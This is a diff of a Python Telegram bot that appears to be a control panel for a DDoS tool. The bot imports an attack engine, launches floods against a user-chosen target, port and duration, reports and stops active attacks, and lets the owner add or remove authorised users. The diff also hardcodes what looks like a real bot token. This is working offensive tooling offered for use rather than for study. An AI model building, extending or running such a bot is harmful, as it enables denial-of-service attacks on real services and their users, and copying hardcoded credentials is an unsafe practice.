@@ -2,10 +2,10 @@ import telebot
 from telebot import types, formatting
 import threading
 import time
-from Fixed import DDoSTool
+from DDoS import DDoSTool
 from requests.exceptions import ConnectionError
 
-TOKEN = '7701982556:AAHXjZJn6vDE5U4qv9-g196qQXL2fyJJAFQ'
+TOKEN = '7701982556:AAGIUx6wy0bIQN6GttO-CaVflrmsWl0Czvk'
 OWNER_ID = 7742396488
 ADMIN_IDS = [OWNER_ID]
 ALLOWED_USERS = [OWNER_ID]
@@ -103,9 +103,12 @@ def send_welcome(message):
         "/status - 𝗦𝗵𝗼𝘄 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝘁𝘁𝗮𝗰𝗸\n"
         "/stop_all - 𝗦𝘁𝗼𝗽 𝗮𝗹𝗹 𝗮𝘁𝘁𝗮𝗰𝗸\n\n"
         "𝗢𝘄𝗻𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱:\n"
-        "/admin - 𝗨𝘀𝗲𝗿 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁"
+        "/add - 𝗔𝗱𝗱 𝗨𝘀𝗲𝗿\n"
+        "/remove - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿\n"
+        "/listusers - 𝗨𝘀𝗲𝗿 𝗟𝗶𝘀𝘁\n"
     )
     bot.reply_to(message, help_text, parse_mode=None)
+
 
 @bot.message_handler(commands=['methods'])
 def show_methods(message):
@@ -175,69 +178,53 @@ def run_attack(attack_id, layer, method, target, port, threads, rpc, duration, c
     try:
         tool.start_attack(layer, method, target, port, threads, rpc, duration)
     except Exception as e:
-        bot.send_message(chat_id, f"⚠️𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗱 𝗙𝗮𝗶𝗹𝗲𝗱: {str(e)}")
+        bot.send_message(chat_id, f"⚠️𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗮𝗶𝗹𝗲𝗱: {str(e)}")
     finally:
         if attack_id in active_attacks:
             del active_attacks[attack_id]
             bot.send_message(chat_id, "✅𝗔𝘁𝘁𝗮𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱")
 
-@bot.message_handler(commands=['admin'])
-def admin_panel(message):
+@bot.message_handler(commands=['add'])
+def handle_add_user(message):
     if not is_owner(message.from_user.id):
+        bot.reply_to(message, "❌ 𝗬𝗼𝘂 𝗮𝗿𝗲𝗻'𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
         return
 
-    keyboard = types.InlineKeyboardMarkup()
-    keyboard.add(
-        types.InlineKeyboardButton("👥 𝗟𝗶𝘀𝘁 𝗨𝘀𝗲𝗿", callback_data="admin_list_users"),
-        types.InlineKeyboardButton("➕ 𝗔𝗱𝗱 𝗨𝘀𝗲𝗿", callback_data="admin_add_user"),
-        types.InlineKeyboardButton("➖ 𝗥𝗲𝗺𝗼𝘃𝗲 𝗨𝘀𝗲𝗿", callback_data="admin_remove_user")
-    )
-    bot.send_message(message.chat.id, "𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹", reply_markup=keyboard)
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
-def handle_admin_actions(call):
-    if not is_owner(call.from_user.id):
-        bot.answer_callback_query(call.id, "❌ You are not authorized!", show_alert=True)
-        return
-
-    action = call.data.split('_')[1]
-    if action == "list_users":
-        with user_management_lock:
-            users_list = "\n".join([f"• <code>{uid}</code>" for uid in ALLOWED_USERS])
-        bot.edit_message_text(
-            f"👥𝗔𝗹𝗹𝗼𝘄𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n{users_list}",
-            call.message.chat.id,
-            call.message.message_id,
-            parse_mode='HTML'
-        )
-    elif action == "add_user":
-        msg = bot.send_message(call.message.chat.id, "Send the user ID to add:")
-        bot.register_next_step_handler(msg, process_add_user)
-    elif action == "remove_user":
-        msg = bot.send_message(call.message.chat.id, "Send the user ID to remove:")
-        bot.register_next_step_handler(msg, process_remove_user)
-
-def process_add_user(message):
     try:
-        user_id = int(message.text)
+        user_id = int(message.text.split()[1])
         if add_user(user_id):
-            reply = f"✅ User <code>{user_id}</code> added successfully!"
+            reply = f"✅ 𝗨𝘀𝗲𝗿 <code>{user_id}</code> 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹!"
         else:
-            reply = f"ℹ️ User <code>{user_id}</code> already exists"
-        bot.send_message(message.chat.id, reply, parse_mode='HTML')
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Invalid user ID! Must be a number", parse_mode='HTML')
+            reply = f"ℹ️ 𝗨𝘀𝗲𝗿 <code>{user_id}</code> 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘁𝘀"
+        bot.reply_to(message, reply, parse_mode='HTML')
+    except (IndexError, ValueError):
+        bot.reply_to(message, "❌ 𝗜𝗻𝘃𝗮𝗶𝗹𝗱 𝗙𝗼𝗿𝗺𝗮𝘁. Usage: /add chatid", parse_mode='HTML')
 
-def process_remove_user(message):
+@bot.message_handler(commands=['remove'])
+def handle_remove_user(message):
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, "❌ 𝗬𝗼𝘂 𝗮𝗿𝗲𝗻'𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
+        return
+
     try:
-        user_id = int(message.text)
+        user_id = int(message.text.split()[1])
         if remove_user(user_id):
-            reply = f"✅ User <code>{user_id}</code> removed successfully!"
+            reply = f"✅ 𝗨𝘀𝗲𝗿 <code>{user_id}</code> 𝗿𝗲𝗺𝗼𝘃𝗲𝗱!"
         else:
-            reply = f"❌ User <code>{user_id}</code> not found or is owner"
-        bot.send_message(message.chat.id, reply, parse_mode='HTML')
-    except ValueError:
-        bot.send_message(message.chat.id, "❌ Invalid user ID! Must be a number", parse_mode='HTML')
+            reply = f"❌ 𝗨𝘀𝗲𝗿 <code>{user_id}</code> 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱"
+        bot.reply_to(message, reply, parse_mode='HTML')
+    except (IndexError, ValueError):
+        bot.reply_to(message, "❌ Invalid format. Usage: /remove chatid", parse_mode='HTML')
+
+@bot.message_handler(commands=['listusers'])
+def handle_list_users(message):
+    if not is_owner(message.from_user.id):
+        bot.reply_to(message, "❌ 𝗬𝗼𝘂 𝗮𝗿𝗲𝗻'𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱!")
+        return
+
+    with user_management_lock:
+        users_list = "\n".join([f"• <code>{uid}</code>" for uid in ALLOWED_USERS])
+    bot.reply_to(message, f"👥𝗔𝗹𝗹𝗼𝘄𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n{users_list}", parse_mode='HTML')
 
 @bot.message_handler(commands=['status'])
 def show_status(message):
@@ -245,10 +232,10 @@ def show_status(message):
         return
 
     if not active_attacks:
-        bot.reply_to(message, "ℹ️ No active attacks")
+        bot.reply_to(message, "𝗡𝗼 𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸")
         return
 
-    status_text = "𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸:\n\n"
+    status_text = "𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸𝘀:\n\n"
     for attack_id, details in active_attacks.items():
         status_text += (
             f"• 𝗠𝗲𝘁𝗵𝗼𝗱: <code>{details['method']}</code>\n"
@@ -268,10 +255,15 @@ def stop_all_attacks(message):
     count = len(active_attacks)
     active_attacks.clear()
     tool.stop_attack()
-    bot.reply_to(message, f"🛑𝗦𝘁𝗼𝗽 𝗔𝗹𝗹 𝗔𝘁𝘁𝗮𝗰𝗸")
+    bot.reply_to(message, f"🛑𝗦𝘁𝗼𝗽𝗽𝗲𝗱 𝗔𝗹𝗹 𝗔𝘁𝘁𝗮𝗰𝗸 ({count} attacks terminated)")
 
 def start_bot():
-    print("⚡ Starting DDoS Bot...")
+    try:
+        bot.delete_webhook()
+        time.sleep(1)
+    except Exception as e:
+        print(f"⚠️ Error removing webhook: {str(e)}")
+    
     while True:
         try:
             bot.infinity_polling()
@@ -280,7 +272,8 @@ def start_bot():
             time.sleep(10)
         except Exception as e:
             print(f"⛔ Critical error: {str(e)}")
-            break
+            print("🔄 Restarting bot in 10 seconds...")
+            time.sleep(10)
 
 if __name__ == '__main__':
     start_bot()
